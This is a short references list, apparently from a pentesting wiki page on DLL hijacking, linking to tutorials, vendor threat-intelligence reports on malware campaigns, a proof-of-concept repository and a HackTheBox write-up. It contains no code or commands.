- [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [Check Point Research – Nimbus Manticore 在欧洲部署新型恶意软件](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [TrustedSec – Hack-cessibility: When DLL Hijacks Meet Windows Helpers](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [Unit 42 – Digital Doppelgangers: Anatomy of Evolving Impersonation Campaigns Distributing Gh0st RAT](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)
- [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [Rapid7 – The Chrysalis Backdoor: A Deep Dive into Lotus Blossom’s toolkit](https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit)
- [0xdf – HTB Bruno ZipSlip → DLL hijack chain](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)


{{#include ../../../banners/hacktricks-training.md}}
